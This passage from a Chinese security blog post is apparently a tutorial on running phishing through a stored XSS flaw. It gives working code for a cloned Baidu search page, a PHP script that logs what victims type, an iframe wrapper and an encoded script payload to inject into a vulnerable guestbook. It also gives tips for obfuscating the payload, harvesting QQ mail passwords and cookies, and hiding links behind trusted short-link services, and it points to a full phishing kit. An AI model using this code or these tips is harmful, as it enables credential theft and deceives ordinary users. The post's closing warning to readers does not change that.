class="name">font</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>设置&amp;nbsp;&amp;nbsp;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">style</span>=<span class="string">"border:0;width: 80px;height: 24px;background-color: #317EF3;color: white;font-size: 12px;"</span>&gt;</span>更多产品<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"40%"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/baidu001.gif"</span> <span class="attr">width</span>=<span class="string">"270px"</span> <span class="attr">height</span>=<span class="string">"129px"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span>	</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"baidu.php"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"wd"</span> <span class="attr">style</span>=<span class="string">"width: 540px;height: 36px;font-size: 20px;"</span>/&gt;</span></span><br><span class="line"> 	<span class="comment">&lt;!-- &lt;img src="image/camera#.png" /&gt; --&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">style</span>=<span class="string">"border:0;width: 100px;height: 44px;background-color: #317EF3;color: white;font-size: 18px;"</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/loading.gif"</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span>手机百度<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"dd"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>把百度设为主页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>关于百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>About Baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>百度推广<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"dd"</span>&gt;</span></span><br><span class="line"> 	◎2018 Baidu <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>使用百度前必读<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>意见反馈<span class="tag">&lt;/<span class="name">a</span>&gt;</span>京ICP证030173号<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/jing01.png"</span> /&gt;</span> 京公网安备110000002000001号<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/jing01.png"</span>/&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	 </span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>接收数据的baidu.php,接收了搜索的关键字wd以添加的方式写入baidu_search.txt并控制js跳转到真正搜索这个关键词的百度页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$wd = urlencode($_REQUEST[&apos;wd&apos;]);</span><br><span class="line">$log = fopen(&quot;baidu_search.txt&quot;, &quot;a&quot;);</span><br><span class="line">fwrite($log, $wd . &quot;\r\n&quot;);</span><br><span class="line">fclose($log);</span><br><span class="line"></span><br><span class="line">#echo $wd;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;script language=&quot;javascript&quot;&gt;&apos;;</span><br><span class="line">echo &quot;location.href=&apos;https://www.baidu.com/s?wd=&quot;.$wd.&quot;&amp;rsv_spt=1&amp;rsv_iqid=0xcd9013d50001ba80&amp;issp=1&amp;f=8&amp;rsv_bp=0&amp;rsv_idx=2&amp;ie=utf-8&amp;tn=baiduhome_pg&amp;rsv_enter=1&amp;rsv_sug3=5&amp;rsv_sug1=2&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;inputT=805&amp;rsv_sug4=816&apos;&quot;;</span><br><span class="line">echo &apos;&lt;/script&gt;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>百度页面目前的样子：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing11.png" alt=""></p>
<p>ps:其中baidu.html中用到的图片我放到github上面了 <a href="https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC" target="_blank" rel="noopener">https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC</a> </p>
<p>ps2:包括一个完整的qq邮箱前端后端钓鱼代码也写到了这个github目录里面，可以拿去学习，如果用于非法用途造成的后果与本人无关，展示效果如下：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing11-1.png" alt=""></p>
<p>至此环境搭建完成。</p>
<h2 id="0x04-复现-钓鱼过程"><a href="#0x04-复现-钓鱼过程" class="headerlink" title="0x04 复现-钓鱼过程"></a>0x04 复现-钓鱼过程</h2><p>我们要复现这个攻击过程需要将js代码写入这个存储型xss漏洞中，这个代码的功能需要做到将我们服务器的baidu.html通过iframe框架调用过来。</p>
<p>那么我们先写一个调用baidu.html的iframe.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"https://www.baidu.com/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://www.baidu.com/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">body&#123;</span></span><br><span class="line"><span class="undefined">      margin:0px;</span></span><br><span class="line"><span class="undefined">	  border:0px;</span></span><br><span class="line"><span class="undefined">	  padding:0px;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">iframe&#123;border:0px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/xss/hk/baidu.html"</span> <span class="attr">id</span>=<span class="string">"iframepage"</span> <span class="attr">name</span>=<span class="string">"iframepage"</span>  <span class="attr">width</span>=<span class="string">"101%"</span> <span class="attr">height</span>=<span class="string">"101%"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这个页面可以将伪造的百度页面整体拉到我们目前页面中。</p>
<p>想将他用到xss漏洞，需要先将iframe.html页面整个url编码一次。</p>
<p>然后将编码好的内容写到这个函数里，再整体写在刚才存在xss漏洞的留言页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.onload=function()&#123;document.write(decodeURI(&quot;%3Chtml%3E%0A%3Chead%3E%0A%3Cmeta%20http-equiv=%22Content-Type%22%20content=%22text/html;%20charset=utf-8%22%20/%3E%20%0A%3Ctitle%3E%E7%99%BE%E5%BA%A6%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%BD%A0%E5%B0%B1%E7%9F%A5%E9%81%93%3C/title%3E%0A%3Clink%20rel=%22icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Clink%20rel=%22shortcut%20icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Cstyle%3Ebody%7B%0A%20%20%20%20%20%20margin:0px;%0A%09%20%20border:0px;%0A%09%20%20padding:0px;%0A%20%20%7D%0Aiframe%7Bborder:0px;%0A%7D%0A%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3Ciframe%20src=%22http://127.0.0.1/xss/hk/baidu.html%22%20id=%22iframepage%22%20name=%22iframepage%22%20%20width=%22101%25%22%20height=%22101%25%22%20%3E%3C/iframe%3E%0A%3C/body%3E%0A%3C/html%3E&quot;))&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing12.png" alt=""></p>
<p>下来我们将这个留言界面的网址，通过新浪短链接等工具生成一个短链接发送给别人，这里就发给我自己进行测试吧。</p>
<p>打开链接发现留言系统的页面已经变成了自己搭建好的伪造百度页面，但是网址还是存在xss漏洞的网址。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing13.png" alt=""></p>
<p>这个时候我们搜索：黑暗剑21</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing14.png" alt=""></p>
<p>然后就会发现跳转到了真正的百度搜索中，返回的词条也一致。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing15.png" alt=""></p>
<p>最后我们打开刚才存储数据的txt文件，发现多出一条 %E9%BB%91%E6%9A%97%E5%89%9121 </p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing16.png" alt=""></p>
<p>解码之后就是黑暗剑21。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing17.png" alt=""></p>
<p>至此我们一个完整的钓鱼流程就结束了。</p>
<h2 id="0x05-额外技巧"><a href="#0x05-额外技巧" class="headerlink" title="0x05 额外技巧"></a>0x05 额外技巧</h2><ul>
<li><p>如果我们不想让别人轻易从存在xss存储漏洞页面通过源代码轻易看出我们的目的，我们就需要通过代码混淆和加密的方式将代码伪造一番。</p>
</li>
<li><p>如果我们将伪造的页面换成qq邮箱，qq空间等用来钓鱼账号密码，那么就得将接收数据的php页面写成接收好数据保存，然后通过代理的方式向真正的页面提交请求，得到返回的cookie再跳转登陆。</p>
</li>
<li><p>要发给别人的钓鱼链接最好通过腾讯、新浪等公司提供的短链接生成器，这样不会在聊天窗口变成红色感叹号，甚至会变成绿色安全符号。</p>
</li>
</ul>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>网络钓鱼是最常见的盗号手段，对大部分具备网络安全意识的人很难起作用，但是如果这个网站制作的极其逼真，又是在一些知名公司挖到的存储型xss漏洞上布置的，很多人看到是正规的大公司域名，是不是就非常容易钓鱼成功呢？</p>
<p>所以面对不明链接的时候，要提升自己的安全意识，能不点则不点，更不要轻易输入账号密码和个人信息。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/uploads/avatar.jpg"
               alt="麻薯" />
          <p class="site-author-name" itemprop="name">麻薯</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">83</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">19</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">56</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        

		
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">麻薯</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  






  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  


  




	





  





  





  






  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>AV.initialize("GWhcWVw7VpoLTRfaQ2D1q3fj-gzGzoHsz", "4eb8jdrkQzBrcf7sJImJdOPd");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  

  <a href="https://github.com/echohun"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://camo.githubusercontent.com/567c3a48d796e2fc06ea80409cc9dd82bf714434/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f6461726b626c75655f3132313632312e706e67" alt="fork me on github" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_left_darkblue_121621.png"></a>
</body>
</html>
